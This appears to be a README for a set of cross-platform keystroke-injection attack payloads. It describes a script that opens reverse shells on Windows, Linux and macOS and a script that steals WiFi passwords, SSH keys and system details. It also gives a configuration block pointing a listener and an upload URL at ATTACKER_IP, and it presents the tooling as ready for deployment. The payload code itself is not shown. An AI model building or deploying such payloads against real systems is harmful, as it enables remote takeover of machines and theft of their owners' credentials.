# 🌐 Multi-Platform Payloads

Cross-platform payloads that work on Windows, Linux, and macOS.

## 📁 Files

| Payload | Description |
|---------|-------------|
| `detect_os.js` | Auto-detect OS and run appropriate reverse shell |
| `exfil_generic.js` | Cross-platform data exfiltration |

## 🎯 Usage

These payloads attempt multiple methods for different operating systems.
At least one method will succeed regardless of target OS.

### detect_os.js

Tries 3 different reverse shell methods:
1. **Windows**: GUI+R → PowerShell
2. **Linux**: CTRL+ALT+T → Bash
3. **macOS**: GUI+SPACE → Python

### exfil_generic.js

Collects system information:
- Hostname, Username, IP
- WiFi passwords (Windows)
- SSH keys (Linux/macOS)
- Browser paths
- Installed applications

## ⚠️ Configuration

Edit these values before deployment:

```javascript
var LHOST = "ATTACKER_IP";   // Your listener IP
var LPORT = "4444";          // Your listener port
var EXFIL_URL = "http://ATTACKER_IP:8080/upload";
```

